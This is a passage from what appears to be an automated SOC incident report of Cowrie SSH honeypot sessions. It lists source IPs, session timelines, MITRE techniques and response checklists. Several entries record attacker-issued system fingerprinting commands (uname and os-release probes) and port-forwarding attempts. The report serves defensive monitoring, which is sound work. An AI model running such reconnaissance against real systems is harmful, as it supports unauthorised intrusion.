| `2026-08-17 01:25:02` | `cowrie.client.version` |
| `2026-08-17 01:25:02` | `cowrie.client.kex` |
| `2026-08-17 01:25:09` | `cowrie.login.success` |
| `2026-08-17 01:25:15` | `cowrie.session.params` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.success` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:15` | `cowrie.command.input` |
| `2026-08-17 01:25:16` | `cowrie.log.closed` |
| `2026-08-17 01:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70427e3f2ed6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:27 |
| **Last Seen** | 2026-08-17 01:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:27:33` | `cowrie.session.connect` |
| `2026-08-17 01:27:35` | `cowrie.client.version` |
| `2026-08-17 01:27:35` | `cowrie.client.kex` |
| `2026-08-17 01:27:42` | `cowrie.login.success` |
| `2026-08-17 01:27:46` | `cowrie.session.params` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.success` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:46` | `cowrie.command.input` |
| `2026-08-17 01:27:48` | `cowrie.log.closed` |
| `2026-08-17 01:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac891abce316

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-17 01:28 |
| **Last Seen** | 2026-08-17 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:28:14` | `cowrie.session.connect` |
| `2026-08-17 01:28:14` | `cowrie.client.version` |
| `2026-08-17 01:28:15` | `cowrie.client.kex` |
| `2026-08-17 01:28:15` | `cowrie.login.success` |
| `2026-08-17 01:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f13691f76ff

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-17 01:28 |
| **Last Seen** | 2026-08-17 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:28:14` | `cowrie.session.connect` |
| `2026-08-17 01:28:14` | `cowrie.client.version` |
| `2026-08-17 01:28:15` | `cowrie.client.kex` |
| `2026-08-17 01:28:16` | `cowrie.login.success` |
| `2026-08-17 01:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-738f15bfd666

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:29 |
| **Last Seen** | 2026-08-17 01:30 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:29:59` | `cowrie.session.connect` |
| `2026-08-17 01:30:01` | `cowrie.client.version` |
| `2026-08-17 01:30:01` | `cowrie.client.kex` |
| `2026-08-17 01:30:08` | `cowrie.login.success` |
| `2026-08-17 01:30:11` | `cowrie.session.params` |
| `2026-08-17 01:30:11` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.success` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:12` | `cowrie.command.input` |
| `2026-08-17 01:30:13` | `cowrie.log.closed` |
| `2026-08-17 01:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fbfcb5d947

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 01:30 |
| **Last Seen** | 2026-08-17 01:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:30:11` | `cowrie.session.connect` |
| `2026-08-17 01:30:11` | `cowrie.client.version` |
| `2026-08-17 01:30:12` | `cowrie.client.kex` |
| `2026-08-17 01:30:12` | `cowrie.login.success` |
| `2026-08-17 01:30:13` | `cowrie.session.params` |
| `2026-08-17 01:30:13` | `cowrie.command.input` |
| `2026-08-17 01:30:13` | `cowrie.log.closed` |
| `2026-08-17 01:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64714439c62f

| Field | Detail |
|---|---|
| **Source IP** | `94.228.240[.]2` |
| **First Seen** | 2026-08-17 01:32 |
| **Last Seen** | 2026-08-17 01:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:32:15` | `cowrie.session.connect` |
| `2026-08-17 01:32:16` | `cowrie.client.version` |
| `2026-08-17 01:32:16` | `cowrie.client.kex` |
| `2026-08-17 01:32:17` | `cowrie.login.success` |
| `2026-08-17 01:32:17` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.228.240[.]2` to AbuseIPDB if not already reported
- [ ] Block `94.228.240[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-115941861759

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:32 |
| **Last Seen** | 2026-08-17 01:32 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:32:20` | `cowrie.session.connect` |
| `2026-08-17 01:32:22` | `cowrie.client.version` |
| `2026-08-17 01:32:22` | `cowrie.client.kex` |
| `2026-08-17 01:32:27` | `cowrie.login.success` |
| `2026-08-17 01:32:30` | `cowrie.session.params` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.success` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:30` | `cowrie.command.input` |
| `2026-08-17 01:32:32` | `cowrie.log.closed` |
| `2026-08-17 01:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149d5edb8d02

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-08-17 01:32 |
| **Last Seen** | 2026-08-17 01:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:32:22` | `cowrie.session.connect` |
| `2026-08-17 01:32:23` | `cowrie.client.version` |
| `2026-08-17 01:32:23` | `cowrie.client.kex` |
| `2026-08-17 01:32:25` | `cowrie.login.success` |
| `2026-08-17 01:32:26` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de1ddc93e306

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:34 |
| **Last Seen** | 2026-08-17 01:34 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:34:44` | `cowrie.session.connect` |
| `2026-08-17 01:34:45` | `cowrie.client.version` |
| `2026-08-17 01:34:45` | `cowrie.client.kex` |
| `2026-08-17 01:34:51` | `cowrie.login.success` |
| `2026-08-17 01:34:56` | `cowrie.session.params` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.success` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:56` | `cowrie.command.input` |
| `2026-08-17 01:34:57` | `cowrie.log.closed` |
| `2026-08-17 01:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df42f162b006

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-08-17 01:35 |
| **Last Seen** | 2026-08-17 01:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:35:58` | `cowrie.session.connect` |
| `2026-08-17 01:35:58` | `cowrie.client.version` |
| `2026-08-17 01:35:58` | `cowrie.client.kex` |
| `2026-08-17 01:35:59` | `cowrie.login.success` |
| `2026-08-17 01:35:59` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:35:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-17 01:35:59` | `cowrie.direct-tcpip.data` |
| `2026-08-17 01:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27f0957172f3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:36 |
| **Last Seen** | 2026-08-17 01:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:36:56` | `cowrie.session.connect` |
| `2026-08-17 01:36:58` | `cowrie.client.version` |
| `2026-08-17 01:36:58` | `cowrie.client.kex` |
| `2026-08-17 01:37:04` | `cowrie.login.success` |
| `2026-08-17 01:37:07` | `cowrie.session.params` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.success` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:07` | `cowrie.command.input` |
| `2026-08-17 01:37:08` | `cowrie.log.closed` |
| `2026-08-17 01:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e555426c0537

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:38 |
| **Last Seen** | 2026-08-17 01:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:38:59` | `cowrie.session.connect` |
| `2026-08-17 01:39:00` | `cowrie.client.version` |
| `2026-08-17 01:39:00` | `cowrie.client.kex` |
| `2026-08-17 01:39:04` | `cowrie.login.success` |
| `2026-08-17 01:39:07` | `cowrie.session.params` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.success` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:07` | `cowrie.command.input` |
| `2026-08-17 01:39:09` | `cowrie.log.closed` |
| `2026-08-17 01:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-318563098dda

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:41 |
| **Last Seen** | 2026-08-17 01:41 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:41:18` | `cowrie.session.connect` |
| `2026-08-17 01:41:19` | `cowrie.client.version` |
| `2026-08-17 01:41:19` | `cowrie.client.kex` |
| `2026-08-17 01:41:25` | `cowrie.login.success` |
| `2026-08-17 01:41:32` | `cowrie.session.params` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.success` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:32` | `cowrie.command.input` |
| `2026-08-17 01:41:33` | `cowrie.log.closed` |
| `2026-08-17 01:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77bfe459ca25

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:43 |
| **Last Seen** | 2026-08-17 01:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:43:47` | `cowrie.session.connect` |
| `2026-08-17 01:43:48` | `cowrie.client.version` |
| `2026-08-17 01:43:48` | `cowrie.client.kex` |
| `2026-08-17 01:43:51` | `cowrie.login.success` |
| `2026-08-17 01:43:54` | `cowrie.session.params` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.success` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:54` | `cowrie.command.input` |
| `2026-08-17 01:43:56` | `cowrie.log.closed` |
| `2026-08-17 01:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b15080d96b3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:46 |
| **Last Seen** | 2026-08-17 01:46 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:46:16` | `cowrie.session.connect` |
| `2026-08-17 01:46:18` | `cowrie.client.version` |
| `2026-08-17 01:46:18` | `cowrie.client.kex` |
| `2026-08-17 01:46:23` | `cowrie.login.success` |
| `2026-08-17 01:46:32` | `cowrie.session.params` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.success` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:32` | `cowrie.command.input` |
| `2026-08-17 01:46:34` | `cowrie.log.closed` |
| `2026-08-17 01:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
